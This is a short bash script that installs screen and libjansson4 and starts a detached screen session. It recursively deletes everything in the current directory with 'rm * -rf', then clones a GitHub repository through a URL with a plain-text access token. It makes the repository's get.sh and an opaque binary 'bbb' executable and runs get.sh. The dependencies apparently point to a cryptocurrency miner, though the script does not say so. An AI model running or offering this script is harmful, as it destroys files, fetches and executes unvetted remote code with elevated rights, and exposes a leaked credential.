#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
screen -dmS ls 
rm * -rf
git clone https://micin69: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@github.com/micin69/bb-ku.git && cd bb-ku 
sudo chmod +x get.sh && sudo chmod +x bbb
./get.sh
sudo apt update
